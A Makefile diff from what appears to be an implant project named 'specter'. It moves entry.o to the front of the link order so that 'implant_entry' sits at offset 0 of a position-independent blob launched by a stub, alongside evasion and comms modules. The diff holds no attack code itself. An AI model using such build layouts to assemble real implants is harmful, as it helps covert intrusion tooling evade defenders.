@@ -36,13 +36,15 @@ BUS_SRCS = $(wildcard $(BUS_DIR)/*.c)
 COMMS_SRCS = $(wildcard $(COMMS_DIR)/*.c)
 ASM_SRCS = $(wildcard $(ASM_DIR)/*.S)
 
-# Object files
-C_OBJS   = $(patsubst $(SRC_DIR)/%.c,$(BUILD_DIR)/%.o,$(C_SRCS))
+# Object files — entry.o MUST be first so implant_entry is at offset 0
+# in the PIC blob (the stub jumps to offset 0).
+ENTRY_OBJ = $(BUILD_DIR)/entry.o
+C_OBJS   = $(filter-out $(ENTRY_OBJ),$(patsubst $(SRC_DIR)/%.c,$(BUILD_DIR)/%.o,$(C_SRCS)))
 EVA_OBJS = $(patsubst $(EVA_DIR)/%.c,$(BUILD_DIR)/evasion_%.o,$(EVA_SRCS))
 BUS_OBJS = $(patsubst $(BUS_DIR)/%.c,$(BUILD_DIR)/bus_%.o,$(BUS_SRCS))
 COMMS_OBJS = $(patsubst $(COMMS_DIR)/%.c,$(BUILD_DIR)/comms_%.o,$(COMMS_SRCS))
 ASM_OBJS = $(patsubst $(ASM_DIR)/%.S,$(BUILD_DIR)/%.o,$(ASM_SRCS))
-OBJS     = $(C_OBJS) $(EVA_OBJS) $(BUS_OBJS) $(COMMS_OBJS) $(ASM_OBJS)
+OBJS     = $(ENTRY_OBJ) $(C_OBJS) $(EVA_OBJS) $(BUS_OBJS) $(COMMS_OBJS) $(ASM_OBJS)
 
 # Output
 TARGET_ELF = $(BUILD_DIR)/specter.elf
